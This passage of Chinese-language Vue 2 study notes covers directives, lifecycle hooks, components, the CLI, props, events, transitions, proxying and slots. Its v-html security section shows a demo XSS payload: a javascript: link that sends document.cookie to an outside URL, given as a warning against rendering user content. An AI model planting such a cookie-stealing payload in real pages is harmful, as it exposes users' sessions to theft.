* 会替换掉节点中原有的内容

**注意-安全性问题**

* 使用诸如`v-html`这种使得用户可以在页面动态生成, 修改任意标签会导致**XXS攻击**, 具体如下
* 恶意用户可以生成含有带有如`document.cookie`的`<a>`标签, 获取受害用户的信息, 当受害用户被诱导点击后, 其`cookie`信息被发送至恶意服务器, 账号信息泄露
* `cookie` 存储自身信息的一些数据

```html
<!-- 模拟 xxs 攻击 -->
<body>
  <div id="root">
    <div>{{name}}</div>
    <div v-text="name"></div>
    <div>{{html}}</div>
    <div v-html="html"></div>
  </div>
  <script>
    new Vue({
      el: "#root",
      data() {
        return {
          name: "张三",
          html: "<a href=javascript:location.href='http://www.baidu.com?'+document.cookie>百度</a>"
        };
      },
    })
  </script>
</body>
```

**因此一定要在可信的内容上使用v-html, 永远不要用在用户提交的内容上**

### 8.3 v-cloak 配合属性选择器 解决网速过慢显示未解析模版问题

* `v-cloak`属性在Vue实例接管模版后, 被移除
* 本质是一个特殊属性

```css
/* 属性选择器 */
[v-cloak]{
    display:none;
};
```

### 8.4 v-once指令 动态内容静态化

* `v-once`所在节点在**初次动态渲染后视为静态内容**

```html
<!-- v-once 仅最初渲染一次所在节点 -->
<body>
  <div id="root">
    <h2 v-once>初始化的n值为:{{n}}</h2>
    <h2>当前的n值为:{{n}}</h2>
    <button @click="n++">n++</button>
  </div>
  <script>
    new Vue({
      el: "#root",
      data() {
        return {
          n: 1,
        };
      },
    })
  </script>
</body>
```

### 8.5 v-pre 渲染跳过静态节点

* `v-pre`可以在`Vue`解析模版时, 跳过其所在节点的编译过程, 效率高
* 建议给所有的静态元素(不涉及到插值等等需要解析的操作), 加上`v-pre`

## 自定义指令

**指令要写为全小写, 多个单词`-`做分割, 定义中名字用字符串**

**指令相关函数中的`this`不是`vm`**

**全局指令`Vue.directive(指令名, 指令配置对象(函数))`**

### 函数式

* 自定义指令事实上是对真实操作`DOM`做的一个封装
* 使用时: `v-指令名="..."`
* 定义在`vm`配置对象的`directives`对象中, 函数名是**属性名**, 没有`v-`, 函数的第一个参数为`ele`, **指令所在的结点, 真实DOM**, 第二个参数为`binding`, **关于传入参数的一些信息**, 其中`binging.value`是`""`中**js表达式执行后的返回值**
* 调用时机在**初次解析模版, *放置真实DOM元素前*, 指令和元素成功绑定时**, **指令所在模版被重新解析, 一些内容发生更新**

```html
<!-- 自定义v-big传入值扩大十倍到写到所在标签 -->
<body>
  <div id="root">
    <h2>当前的n值是: <span v-text="n"></span></h2>
    <h2>放大十倍的n值是: <span v-big="n"></span></h2>
    <button @click="n++">n++</button>
  </div>
  <script>
    new Vue({
      el: "#root",
      data() {
        return {
          n: 1
        }
      },
      directives: {
        big(ele, binding){
          ele.innerText = binding.value * 10;
        },
      }
    })
  </script>
</body>
```

### 对象式

* 相比于函数式的调用时机仅仅为**模版初次解析绑定元素和指令时, 重新解析模版时**
* 对象式多了一个时机为**初次解析模版后插入真实页面后**
* 可以完成一些需要插入页面后才能进行的对DOM操作, 如获取焦点

```js
// v-fbind 获取焦点
directives: {
    big(ele, binding){
        ele.innerText = binding.value * 10;
    },
    fbind: {
        bind(element, binding){
        // 指令与元素成功绑定时调用
        console.log("bind");
        element.value = binding.value;
        },
        inserted(element, binding){
        // 指令所在元素被插入页面时调用
        console.log("inserted");
        element.focus();
        },
        update(element, binding){
        // 指令所在元素模版被重新解析时
        console.log("update");
        element.value = binding.value;
        }
    }
}
```

## 玖 生命周期

*vm的一生*

*所谓生命周期即为vm在页面的各个时间节点的操作*

*在特点时间节点有着不同工作的vm管理的函数为生命周期函数(生命周期钩子)*

### 9.1 mounted 完成解析并放入真实DOM后的操作

* `Vue`的配置项`mounted`函数在`Vue`最初解析模板, 并把真实DOM替换模板(**挂载**)时调用

```html
<!-- mount 最初解析完成并完成挂载(真实DOM替换掉模版)后调用-->
<body>
  <div id="root">
    <h2 :style="{opacity}">Hello</h2>
  </div>
  <script>
    new Vue({
      el: "#root",
      data() {
        return {
          opacity: 1,
        };
      },
      mounted() {
        // 最初解析完成并完成挂载(真实DOM替换掉模版)后调用
        setInterval(()=>{
          this.opacity -= 0.01;
          if(this.opacity <= 0) this.opacity += 1;
        }, 16);
      },
    });
  </script>
</body>
```

*`debuger` 断点*


### 9.2 详细的生命周期

1. 开始执行`new Vue()`
2. 初始化生命周期, 事件, **数据代理和数据劫持还未开始**
3. 调用`beforeCreate`函数, **此时*无法*通过`vm`访问到`data`,`methods`中的数据, 方法** *Create指的是`data`, `method`这些属性或者说是数据代理或者数据劫持被创建*
4. 进行**数据代理和数据劫持**, `vm`拥有了`data`, `method`属性方法
5. 调用`Created`函数, **此时*可以*通过`vm`访问到`data`,`methods`中的数据, 方法**
6. 开始解析模板, 在内存中生成虚拟DOM, **页面还不能显示解析好的内容**
7. 调用`beforeMount`函数, **此时页面呈现的是*未经Vue编译的模板DOM结构***, 由于已经生成需要的虚拟DOM, 而未替换, **在此时进行所有对真实DOM的操作, 最后都不奏效**
8. 将内存中的虚拟DOM转为真实DOM插入页面
9. **重要** 调用`mounted`函数, **页面中呈现的是*经过Vue编译的DOM***, 对DOM的操作均有效(*尽量避免*) **一般在此处进行：**
    * 开启定时器
    * 发送网络请求
    * 订阅消息
    * 绑定自定义事件等**初始化操作**
10. 当`data`中元素改变, 调用`beforeUpdate`函数, **此时数据都是改变后的, 但是页面是旧的**, ***页面和数据尚未同步***
11. 根据新数据, 生成新的虚拟DOM, 与旧的虚拟DOM比较更新, 从而完成页面更新
12. 调用`updated`函数, **此时数据和页面都是最新的, 保持同步**
13. **重要** 当调用`$destroy`方法时, 调用`beforeDestroy`函数, 此时`data`, `methods`, 指令等均可用, **一般在此处进行：** 
    * 关闭定时器
    * 取消订阅消息
    * 解绑自定义事件等**首尾操作**
14. 解绑`watch`, 子组件, 事件监听等, 完成自毁操作
15. 调用`destroyed`函数

### 9.3 updated钩子和$nextTick方法

* Vue中并**不是在数据发生更改时即刻更新DOM, 而是采取批量更新的方式, 在恰当的时机, 进行DOM更新**
* 因此在数据修改后, 往往不能立即获取到更新后的DOM节点, 组件/vm的`$nextTick`方法可以**在下一次DOM更新后随即触发**
* `this.$nextTick(function(){})` 回调函数中`this`指向vm/组件实例对象
* 而`updatad`是每次DOM更新后都会触发, 触发时机多于`$nextTick`
* `$nextTick`很常用

## 拾 组件

*实现应用中局部功能代码和资源的集合*

*方便维护, 复用率高*


### 10.1 非单文件组件

*一个文件中包含多个组件*

#### 10.1.1 创建-注册-使用 Vue中定义和使用组件

1. 创建组件 `const name = Vue.extent(options)`
   *  `options` 相当于`vm`创建时的**配置对象**, 里面可以传入大部分`vm`配置时的如`data`, `templete`等对象, 但是**不传入**`el`, 因为组件**并不是固定服务于特定容器的, 由vm指定它该服务于哪个容器**, `data`必须采用**函数**, 因为当多个位置需要同一个组件时, 要保证各自的`data`不相同
2. 注册组件 **这一步划定了组件使用的范围**
   * **局部注册** **常用** 在`vm`的配置对象中的`components`配置项中, 按照`使用名称: 定义对象`进行配置, 一般两个名字相同, 简写为一个    
   * **全局注册** **相当于注册在所有`vm`下** `Vue.component("使用名称", 定义对象)`
3. 使用组件, 在**有着注册了相应组件的vm管理的容器下**, 直接使用`<组件使用名称></组件使用名称>`引入组件

```html
<!-- 非单文件组件的基本使用 创建-注册-使用 -->
<body>
  <div id="root">
    <!-- 编写组件标签 -->
    <xuexiao></xuexiao>
    <hr>
    <xuesheng></xuesheng>
    <xuesheng></xuesheng>
  </div>
  <script>
    // school 组件 
    const school = Vue.extend({
      // 不写 el 配置项, 最终由 vm 决定服务于哪个容器
      //el: "#root",
      data() { // 写成函数式 data 为了让不同地方用的组件不共享一套 data
        return {
          schoolName: "中南大学",
          address: "清水路",
        }
      },
      template: `
      <div>
        <h2>学校名称: {{schoolName}}</h2>
        <h2>学校地址: {{address}}</h2>
      </div>
      `
    })

    const student = Vue.extend({
      data() {
        return {
          studentName: "张三",
          age: 20
        }
      },
      template: `
      <div>
        <h2>学生姓名: {{studentName}}</h2>
        <h2>学生年龄: {{age}}</h2>  
      </div>
      `
    })
    
    new Vue({
      el: "#root",
      components: {
        // 局部注册组件
        xuexiao: school,
        xuesheng: student
      }
    })
  </script>
</body>
```

#### 10.1.2 组件使用名称规范

* 单个单词
  * 全小写 `school`
  * 首字母大写 `School` **常用**
* 多个单词
  * 全小写, 单词间`-`做分割, 对象中`key`写成字符串 `my-school`
  * 每一个单词的首字母大写 `MySchool` **需要在脚手架环境中进行** **常用**
* 不要使用`html`中预留的标签名

#### 10.1.3 name </> const name = {} 其它使用事项

* 可以在**创建组件时**在配置对象中的`name`配置项, 指定组件在**开发者工具中显示的名字**, **使用时的标签名字仍以注册时指定的使用名称为准**
* 使用标签也可以写成**单标签自闭合** `<school/>` **需要脚手架环境, 否则会出现bug**
* **创建时**可以简写为`const name = options` *注册时Vue自动补充Vue.extend*

#### 10.1.4 组件的嵌套

* **子组件需要先于父组件前被创建**
* 在相应父组件的`components`中被注册
* **使用时要在父组件的`templete`中进行**
* 真实开发中`vm`下只管理一个`app`组件, 其余组件受`app`组件管理

```html
<!-- 组件的嵌套 -->
<body>
  <div id="root"></div>
  <script>
    // 创建 hello 组件
    const hello = {
      template: `
        <h1>{{msg}}</h1>
      `,
      data() {
        return {
          msg: "Hello!"
        }
      },
    }
    // 创建 student 组件
    const student = {
      template: `
        <div>
          <h2>学生姓名: {{name}}</h2>
          <h2>学生年龄: {{age}}</h2>
        </div>
      `,
      data() {
        return {
          name: "张三",
          age: 20
        }
      },
    }
    // 创建 school 组件
    const school = {
      template: `
        <div>
          <h2>学校名称: {{name}}</h2>
          <h2>学校地址: {{address}}</h2>
          <student></student>
        </div>
      `,
      data() {
        return {
          name: "中南大学",
          address: "清水路"
        }
      },
      components: {
        student
      }
    };
    // 创建 app 组件
    const app = {
      template: `
      <div>
        <school></school>
        <hello></hello>
      </div>
      `,
      components: {
        hello,
        school
      }
    }
    
    // 创建 vm
    new Vue({
      template: 
      `<app></app>`,
      el: "#root",
      data() {
        return {
          msg: "Hello"
        }
      },
      components: {
        app
      }
    })
  </script>
</body>
```

#### 10.1.5 VueComponent 构造函数 组件底层

* `const name = Vue.extend(options)`的返回值`name`是一个`VueComponent`构造函数 *每次调用`Vue.extend()`返回的是**全新的`VueComponent`构造函数***
* 当Vue**解析到模版相应组件标签**时, 调用`new VueComponent(options)`创建**组件的实例对象**
* 组件配置中, `data`, `methods`, `computed`, `watch`中函数中`this`的指向都是**组件实例对象vc**


#### 10.1.6 VueComponent和Vue的继承关系

* `VueComponent.prototype._proto_ === Vue.prototype`
* 让**组件实例对象**也可以访问到`Vue`原型对象身上的方法

### 10.2 .vue 单文件组件

`.vue`文件的命名遵循**组件命名规范**

*.vue文件的结构*
```html
<template>
    <!--  组件的结构 --html -->
    <div>
        
    </div>
</template>


<script>
    // 组件交互相关代码 --js

</script>

<style>
    /* 组件的样式 --css */

</style>
```

* `script`标签下用`export default`向外暴露组件配置对象, 将来可以通过`import xx form xx`导入
* `name`属性和文件名一致
* 注册相应组件时先`import`再注册
* `vm`写在`main.js`作为入口文件, `index.html`引入`Vue.js`和`main.js`以及创建相应模板
* `App.vue`

*index.html*
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dome</title>
</head>
<body>
  <div id="root"></div>
  <script src="../lib/vue.js"></script>
  <script src="./main.js"></script>
</body>
</html>
```

*main.js*
```js
import App from "./App"

new Vue({
    el: "#root",
    template: "<App></App>",
    components: {App},
})
```

*App.vue*
```html
<template>
  <div>
    <School></School>
    <Student></Student>
  </div>
</template>

<script>
  import School from "./School"
  import Student from "./Student"

  export default {
    name: "App",
    components: {
      School, 
      Student
    }
  }
</script>

<style>

</style>
```

*School.vue*
```html
<template>
  <div class="demo">
    <h2>学校名称: {{schoolName}}</h2>
    <h2>学校地址: {{address}}</h2>
    <button @click="showName">点我提示学校名</button>
  </div>
</template>


<script>
  export default {
    name: "School",
    data() {
      return {
        schoolName: "中南大学",
        address: "清水路"
      }
  },
  methods: {
      showName(){
        alert(this.showName);
      }
    },
  };
</script>

<style>
  .demo{
    background-color: pink;
  }
</style>
```

*student.vue*
```html
<template>
  <div>
    <h2>学生姓名: {{name}}</h2>
    <h2>学生年龄: {{age}}</h2>
  </div>
</template>


<script>
  export default {
    name: "Student",
    data() {
      return {
        name: "张三",
        age: 19
      }
    },
  };
</script>
```

## 拾壹 脚手架

*Vue官方提供的标准化开发工具* **开发平台**

文档 https://cli.vuejs.org/zh/

### 11.1 create run 脚手架的创建运行

*全局安装`@vue/cli`*
>npm install -g @vue/cli

***切换至项目目录**, 创建脚手架*
>vue create 项目名

*执行提示的两个命令*

>cd 项目名 & npm run serve

*打开提示的地址 本机和局域网地址*


### 11.2 项目目录组成

* `node_module` 包含了安装的依赖包
* `public` 包含了图标文件, `index.html`
  * `index.html`
    * `<meta http-equiv="X-UA-Compatible" content="IE=edge">`配置IE浏览器选项
    * `<meta name="viewport" content="width=device-width,initial-scale=1.0">`开启移动端理想视口
    * `<%= BASE_URL %>`表示`public`目录, 处于`public`目录下的文件, 推荐用此路径引入代替`./`,`../`
    * `<%= htmlWebpackPlugin.options.title %>` 表示`package.json的name属性`
    * `<noscript>`浏览器不支持js则渲染此标签下内容
* `src` 在此目录写代码
  * `main.js` 程序的入口, 执行`npm run serve`先进这里 
    * 注意引入Vue`import Vue from "vue"`
  * `assets` 存放一些静态资源 图片视频等
  * `App.vue` 略
  * `components` 存放各个组件`.vue`文件
* `.gitgnore` git时忽略文件
* `bable.config.js` 配置ES6=>ES5的规则
* `package.json`, `package-lock.json` 包的配置文件
* `vue.config.json` 脚手架工作相关配置
  * `lintOnSave:false`关闭语法检查
* 其余的`JSON`文件, 配置文件

### 11.3 `main.js`中`vm`配置对象上的`render`属性 解析模版

*通过`import Vue from "vue"`引入的是一个`vue/dist/vue.runtime.esm.js`残缺版文件, 没有包括模版解析器, 不能通过`template`的形式解析模板*

* 一种解决方法是`import Vue from "vue/dist/vue"`引入完成版
* 另一种就是通过`render`函数完成对模版的操作
  * `render(createElement)`
    * `createElement` 创建元素的函数, 第一个参数为元素名如`"h1"`, 第二个参数为值如`"Hello"`, 可以返回一个`<h1>Hello<h1>`的虚拟DOM
    * 可以把返回的虚拟DOM解析到`vm`控制的容器
    * `render: h => h(App)` 创建了虚拟节点并解析到`vm`控制的容器, **注意`App`是变量**

```js
// main.js
import Vue from 'vue';
import App from "./App"

new Vue({
    el: "#app",
    render: h => h(App),
})
```

### 11.4 ref属性 Vue中的id

* `Vue`中获取真实DOM的方法
* 给有获取需求的DOM元素添加`ref`属性
* 获取时, 采用**管理这个DOM元素所在模版的组件实例**的`$ref.DOM对应ref值`获取
* **如果给组件标签加上ref属性**, 在获取时, 获取到的是**其组件实例对象**

```html
<!-- ref 获取真实元素或子组件实例-->
<template>
  <div>
    <h1 v-text="msg" ref="title"></h1>
    <button @click="printDOM">点我输出上方DOM元素</button>
    <School/>
  </div>
</template>

<script>
import School from "./components/School"

export default {
  name: "App",
  components: {School},
  data() {
    return {
      msg: "Hello",
    }
  },
  methods: {
    printDOM(){
      console.log(this.$refs.title);
    }
  },
}
</script>

<style>

</style>
```

### 11.5 props 配置项 传入定制组件属性

*当需要组件的结构, 但是`data`里的数据需要视情况而定的, 可以通过引入组件标签时, 赋予相应属性*

* `<School name="中南大学"/>`
* 当要传入非字符串类型时, 应采用`v-bind:`使`""`中为`js表达式`, `:age="18"`
* 注意此时`data`中不应写`name`属性
* 在**组件实例对象中**`props`**配置项**, 应传入**定制组件属性**
  * `props = [属性1, 属性2....]` **常用**, 数组形式
  * `props = {属性1: String, 属性2: Number}`对象形式, 指定各属性传入的类型, 如不符合会报错
  * `props = {属性1: {type: String, required: true}, 属性2: {type: Number, default: 99}...}`对象-对象形式, 指定各属性传入的类型, 以及是否必须传入, 默认值(后两者出现一个即可), 如不符合会报错
* 通过`props`传入的属性同样直接挂载到**组件实例对象**
* 利用`props`传入的个性化属性**不应后续修改**, 可以通过`data`配置项中, `另一属性 = this.个性化属性`来实现间接修改, *这样可行的原因是`props`传入优先于`data`读取*
* 可以实现父子间的数据传递

*App.vue*
```html
<template>
  <div>
    <Student name="李四" sex="女" />
    <hr>
    <Student name="张三" sex="男" :age="20"/>
    <hr>
    <Student name="李五" sex="女" :age="19"/>
  </div>
</template>

<script>
import Student from "./components/Student"

export default {
  name: "App",
  components: {Student},
}
</script>
```

*Student.vue*
```html
<!-- 动态传入属性 -->
<template>
  <div class="school">
    <h1>{{msg}}</h1>
    <h2>学生姓名: {{name}}</h2>
    <h2>学生性别: {{sex}}</h2>
    <h2>学生年龄: {{age + 1}}</h2>
  </div>
</template>

<script>
export default {
  data() {
    return {
      msg: "Hello",
    }
  },
  //props: ["name", "sex", "age"]
  /*props: {
    name: String,
    age: Number,
    sex: String
  }*/
  props: {
    name: {
      type: String,
      required: true,
    },
    sex: {
      type: String,
      required: true,
    },
    age: {
      type: Number,
      default: 99
    },
  }
}
</script>
```

### 11.6 mixin混入 组件部分属性方法复用

*不同组件共用一套**部分相同**的data, methods, mounted等等*

* 建立一个外部`js`文件, 在此文件中暴露若干**对象**, *和组件配置对象同等级别*, 其内部有复用的属性, 方法
* 在需要此属性方法的组件文件中引入此文件, 在组件配置对象中的`mixin`配置项**数组**中加入相应对象
* 如果混入的属性方法和原组件配置对象的属性方法冲突, **以原组件配置对象的属性方法为准**, **生命周期钩子则全部都生效**, 先调混合的再调自身的
* **全局引入**, 在`main.js`引入各个混合对象, 调用`Vue.mixin(混合对象)` 所有的组件实例包括`vm`都会得到混合的方法和属性

*mixin.js*
```js
// 复用 methods
export default {
  methods: {
    alertName(){
      alert(this.name)
    }
  },
}
```

*Student.vue*
```html
<!-- 通过混合使用alertName -->
<template>
  <div>
    <h2 @click="alertName">学生姓名: {{name}}</h2>
    <h2>学生性别: {{sex}}</h2>
  </div>
</template>

<script>
import mixin from "./mixin"

export default {
  name: "Student",
  data() {
    return {
      name: "张三",
      sex: "男",
    }
  },
  mixins: [mixin]
}
</script>
```

### 11.7 Vue.use(plugins) 插件

*增强Vue*

* 包含`install`方法的对象, 写在`src`中, 文件名通常`plugins.js`
* 在`main.js`创建`vm`前引入使用
* 通过`Vue.use(plugins[, extremes])`使用, 可以多次调用运用多个插件
* `install`方法
  * `install(Vue[, extremes])` 接收到`Vue`构造函数, 因此所有全局配置的方法属性在此进行 **全局过滤器, 全局指令, 全局混入, 原型方法属性...**, 此外还可以接受到`Vue.use()`传入的其他参数


*plugins.js*
```js
// 定义插件
export default {
  install(Vue){
    console.log("Hello install@@@", Vue);
    Vue.config.productionTip = false
  }
}
```

*main.js*
```js
// 导入插件, 使用
import Vue from 'vue'
import App from './App'
import plugins from './plugins'

Vue.use(plugins)

new Vue({
  el: "#app",
  render: h => h(App)
})
```

### 11.8 scoped样式 局部样式

*各个组件中的样式最终会汇总到一起, 容易导致类名冲突*

* 给某个组件的`style`标签加上`scoped`属性, 限定该样式只在本组件范围生效
* *原理是Vue给应用局部样式的Dom元素添加了特定属性*
* 一般不在`app`组件中用`scoped`原因是`app`中的`style`一般是很多子组件共有的样式, 添加`scoped`之后只会在`app`中的如`h1`, `div`等原生标签添加相应类名后生效

```html
<!-- scoped属性 使得样式生效于当前组件 -->
<template>
  <div class="student">
    <h2>学校名称: {{name}}</h2>
    <h2>学校地址: {{address}}</h2>
  </div>
</template>

<script>
export default {
  name: "School",
  data() {
    return {
      name: "中南大学",
      address: "清水路",
    }
  },
}
</script>

<style scoped>
.student{
  background-color: skyblue;
}
</style>
```

## 拾贰 组件的自定义事件

* 内置事件 - 用于`html`元素
* 自定义事件 - 用于**组件**

### 12.1 this.$emit 绑定自定义事件

* 给子组件实例对象绑定自定义事件`selfEvent`, 在触发时, 调用`demo`函数: 
  * `<Student @selfEvent="demo" />`
  * `<Student ref="student">`, 在父组件的`mounted`函数中获取到实例对象, 用`$on`绑定: `this.refs.student.$on("selfEvent", this.demo)` **灵活性强, 可以等待一定条件在绑定事件**
* 调用函数`demo`写在父元素
* 绑定的事件写在**被绑定的组件实例对象**`Student`, 在应触发事件的位置调用`组件实例对象.$emit(事件名[, 回调函数传参])` 回调函数`demo`将会收到传递参数, **可以实现子向父传递数据**


*app.vue*
```html
<!-- 两种方式实现子向父传递数据 -->
<template>
  <div class="app">
    <h1>{{msg}}</h1>
    <!-- <Student @selfEvent="getStudentName"/> -->
    <!-- 通过父组件给组件传递函数类型数据从而实现子给父传递数据 -->
    <School :getSchoolName="getSchoolName"/>
    <Student ref="student"/>
  </div>
</template>

<script>
import Student from "./components/Student"
import School from "./components/School"

export default {
  name: "App",
  components: {Student, School},
  data() {
    return {
      msg: "Hello"
    }
  },
  methods: {
    getSchoolName(name){
      console.log('App收到了学校名: ', name)
      this.msg = name
    },
    getStudentName(name){
      console.log("App收到了学生名: ", name)
      this.msg = name
    },
  },
  mounted() {
      this.$refs.student.$on('selfEvent', this.getStudentName)
  },
}
</script>

<style scoped>
.app{
  background-color: gray;
  padding: 5px;
}
</style>
```

*student.vue*

```html
<template>
  <div class="student">
    <button @click="sendStudentName">发生学生名</button>
    <h2>学生姓名: {{name}}</h2>
    <h2>学生性别: {{sex}}</h2>
  </div>
</template>

<script>
export default {
  name: "Student",
  data() {
    return {
      name: "张三",
      sex: "男",
    }
  },
  methods: {
    sendStudentName(){
      // 触发事件 并传递name给回调函数
      this.$emit("selfEvent", this.name)
    }
  }
}
</script>

<style scoped>
.student{
  background-color: orange;
  padding: 5px;
}
</style>
```

*school.vue*
```html
<template>
  <div class="school">
    <button @click="sendSchoolName">发送名称</button>
    <h2>学校名称: {{name}}</h2>
    <h2>学校地址: {{address}}</h2>
  </div>
</template>

<script>
export default {
  name: "School",
  data() {
    return {
      name: "中南大学",
      address: "清水路",
    }
  },
  props: ['getSchoolName'],
  methods: {
    sendSchoolName(){
      this.getSchoolName(this.name)
    }
  }
}
</script>

<style scoped>
.school{
  background-color: skyblue;
  padding: 5px;
  margin-top: 5px;
}
</style>
```

### 12.2 this.$off 解绑自定义事件

* 在被绑定事件的组件实例对象上解绑
* `实例对象.off(事件名)`解绑一个事件
* `实例对象.off([事件1, 事件2])`解绑多个事件
* `实例对象.off()`解绑全部事件

### 12.3 .native修饰符 给组件绑定原生DOM事件

* 给组件直接绑定诸如`@click="demo"`的原生DOM事件也会被认为是自定义事件
* 应使用`native`才会被认为是原生事件`@click.native="demo"`, **事件绑定给了组件的根元素**

## 拾叁 组件间通信

### 13.1 Vue.prototype.$bus 全局事件总线

*任意组件间通信*

* 借助一个**任意组件中可以访问到的专用于通信的组件**, 这个组件可以是`vm`
* `beforeCreate(){Vue.prototype.$bus = this}`
* 在接收信息的组件中**给这个通信组件绑定事件** `组件1.$bus.$on(事件1, 接收数据进行处理的回调函数)`
* 在发生信息的组件中**触发这个通信组件的对应事件**`组件2.$bus.$emit(事件1, 数据)`

*main.js*
```js
// vm配置对象中
beforeCreate(){
  Vue.prototype.$bus = this
}
```

*Student.vue*
```js
// 发送组件中 
this.$bus.$on("hello", data => {
  console.log("我是bus, 我帮助School组件收到了", data);
})
```

*School.vue*
```js
// 接收组件中
this.$bus.$emit("hello", "I am your brother")
```

*接收组件beforeDestroy时应销毁总线上的**相应事件***

### 13.2 消息订阅与发布

*第三方库pubsub-js*

> npm i pubsub-js

*任意组件间通信*

* 在通信的双方导入`import pubsub from "pubsub-js"`
* 在订阅消息(接收数据的一方)调用`this.PubId = pubsub.subscribe(消息名, (消息名, data) => {}` `this`为当前组件 **注意写成箭头函数, *否则函数中`this`为`undefined`*
* 在发布消息(发送数据的一方)调用`pubsub.publish(消息名, data)`
* 在订阅消息一方销毁时, 取消订阅`pubsub.unsubscribe(this.pubId)`

*Vue中一般使用事件总线通信*


## 拾肆 过渡与动画

### 14.1 transition标签的使用 动画实现 进出样式

* 使用C3的语法
* `@keyframes 动画名{}`定义动画
* .transition的`name`-enter-active{animation..} 选择器使用**元素出场动画**
* .transition的`name`-leave-active{animation..} 选择器使用**元素离场动画**
* `<transition><transition>`包裹住添加动画了标签, 
  * `name`属性值为选择器的前缀, 如不添加会使用`v`作为前缀的类名选择器
  * 添加`appear`属性表示, 第一次渲染时, 有入场动画

*Test.vue*
```html
<!-- 给 h1 添加入场离场动画 -->
<template>
  <div>
    <button @click="showOrHide">显示/隐藏</button>
    <transition name="hello" appear>
      <h1 v-show="isShow">hi</h1>
    </transition>
  </div>
</template>

<script>
  export default {
    name: "Test",
    data() {
      return {
        isShow: true
      }
    },
    methods: {
      showOrHide(){
        this.isShow = this.isShow ? false : true
      }
    },
  }
</script>

<style scoped>
  h1{
    background-color: orange;
  }
  .hello-enter-active{
    animation: demo 1s;
  }
  .hello-leave-active{
    animation: demo 1s reverse;
  }
  @keyframes demo{
    from{
      transform: translateX(-100%);
    }
    to{
      transform: translateX(0px);
    }
  }
</style>
```

### 14.2 v-enter v-enter-to 过渡实现 进出样式

* Vue在元素显示时会先添加两个类名`transition标签的nam-enter-active`, `transition标签的name-enter`, 
* 随即立即取消掉`transition标签的name-enter`, 并添加`transition标签的name-enter-to`
* 离开时同理

*过渡实现进出动画*
```css
/* 进入的起点 */
.hello-enter, .hello-leave-to{
  transform: translateX(-100%)
}
/* 进入的终点 */
.hello-enter-to, .hello-leave{
  transform: translateX(0);
}
.hello-enter-active, .hello-leave-active{
  transition: 0.5s linear;
}
```

### 14.3 transition-group标签 多个元素过渡效果

* `transition`标签只能内含一个单一的标签
* 如需多个标签使用同一个过渡效果, 需要使用`transition-key`包裹, **并给每个标签添加唯一`key`属性**

```html
<!-- 多个元素过渡 -->
<transition-group name="hello" appear>
  <h1 v-show="isShow" key="1">hi</h1>
  <h1 v-show="!isShow" key="2">你好</h1>
</transition-group>
```

### 14.4 animate.css 集成第三方动画

https://animate.style/

*animate.css库*

1. 下载
> npm install animate.css --save
2. 导入
> import animate.css
3. 使用
  * 在采用动画的`transition`标签的`name`属性, 设置属性值为`animate__animated animate__bounce`
  * `enter-active-class`属性写入使用的进场动画类名
  * `leave-active-class`属性写入使用的离场动画类名

## 拾伍 Vue解决跨域问题 代理服务器

* 跨域问题指的是前端发送请求方和后端处理请求方出现**协议, 主机名, 端口号**三者不一, 触发**浏览器同源策略**的情况
* 常有后端利用`cores`解决
* 前端可以利用**代理服务器**规避**浏览器同源策略**

### 15.1 vue.config.js devServer 简单配置单个代理

*vue.config.js中添加*
```js
devServer: {
  proxy: 'http://localhost:4000' // 目标服务器
},
```

* 之后请求数据只要请求**脚手架服务器端口即可**
* 注意当脚手架服务器拥有资源, 不会转发给目标服务器 **以`public`文件夹作为根目录**

*node.js服务器端*
```js
// 接收get请求发送数据
const express = require("express")

const app = express();


app.get("/students", (req, res) => {
    res.send({name: "张三", age: 33});
});

app.listen(5000, () => {
    console.log("express server running at http://127.0.0.1:5000");
});
```

*app.vue前端*
```html
// axios请求数据
<template>
  <div >
    <button @click="getStudent">发送请求</button>
  </div>
</template>

<script>
  import axios from 'axios';

  export default {
    name: "App",
    methods: {
      getStudent(){
        axios({
          url: "http://localhost:8080"
        }).then(res => {
          console.log(res.data);
        }).catch(err => {
          console.log("请求失败", err.message);
        })
      }
    },
  }
</script>
```

### 15.2 devServer 详细配置

* 可以解决简单配置时, 目标资源与本机资源名冲突时, 不可转发的问题
* 可以实现多个目标服务器的代理

```js
devServer: {
  proxy: {
    '/car': {
      target: 'http://127.0.0.1:5001',
      // ws: true,
      // changeOrigin: true
      pathRewrite: {'^/car': ''}
    },
  }
}
```

* `/car`前缀, 当代理服务器发现请求的地址为此前缀, 会将请求转发给`target`
* `pathRewrite: {'^/car': ''}`添加此属性, 正则表达式重写了请求路径, 将路径中的`/car`前缀删除, 否则向最终目标服务器请求时, 仍带有`/car`前缀
* `ws` 用于支持websocket 默认`true`
* `changeOrigin` 表示告知服务器的来源 `true` 表示和服务器地址相同`false`表示真实来源 默认`true` *控制请求头的`host`值*

```js
// app.vue中向代理服务器发送请求, 代理服务器在路径重写后请求目标服务器的 / 资源
getStudent(){
  axios({
    url: "http://localhost:8080/car"
  }).then(res => {
    console.log(res.data);
  }).catch(err => {
    console.log("请求失败", err.message);
  })
}
```

## Vue-resource

*不常用*

* 对于`xhr`的封装, 和`axios`地位相同
* 是一个Vue插件

> npm i vue-resource

* `import vueResource from vue-resource`
* `Vue.use(vueResource)`
* vm或组件实例对象上`this.$http()`

```js
// 和axios用法基本相似, 但直接get, post..里面是请求地址
this.$http.get("http://localhost:8080/car").then(res => {
  console.log(res.data);
}).catch(err => {
  console.log("请求失败", err.message);
})
```

## 拾陆 slot 插槽 

### 16.1 slot默认插槽

```html
<!-- 在List组件标签中插入标签 实现定值-->
<List>
  <img src="..">  
</List>
```
*List.vue*
```html
<template>
  <div class="list">
    <h1>{{title}}</h1>
    <slot></slot>
  </div>
</template>
```

* 在组件中保留位置等待父元素操作填充自定义标签
* 用`slot`标签预留
* 标签在父节点解析完成后传给子组件, 可以在父组件编写插槽的样式, 也可以在子组件中编写其样式

*app.vue*
```html
<template>
  <div class="app">
    <List title="美食分类">
      <img src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
    </List>

    <List title="游戏分类">
      <ul>
        <li v-for="(item,index) in contents" :key="index">{{item}}</li>
      </ul>
    </List>

    <List title="电影分类">
      <video src="http://vjs.zencdn.net/v/oceans.mp4" controls></video>
    </List>
  </div>
</template>

<script>
  import List from './components/List';

  export default {
    name: "App",
    data() {
      return {
        title: "游戏分类", 
        contents: ["红色警戒", "穿越火线", "超级玛丽", "劲舞团"],
      }
    },
    components: {List}
  }
</script>

<style>
  .app{
    display: flex;
    justify-content: space-around;
  }
  img{
    width: 300px;
